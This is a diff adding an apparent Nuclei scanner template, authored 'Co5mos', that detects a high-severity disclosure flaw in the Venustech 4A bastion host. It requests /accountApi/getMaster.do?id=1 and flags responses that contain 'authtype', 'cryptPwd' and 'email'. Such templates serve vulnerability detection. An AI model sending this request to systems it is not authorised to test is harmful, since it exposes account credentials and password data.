@@ -1,0 +1,26 @@
+id: venustech-4a-getMaster-disclosure
+
+info:
+  name: Venustech 4A - Disclosure
+  author: Co5mos
+  severity: high
+  tags: venusense-4A-堡垒机
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/accountApi/getMaster.do?id=1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'authtype'
+          - 'cryptPwd'
+          - 'email'
+        condition: and
+
+      - type: status
+        status:
+          - 200
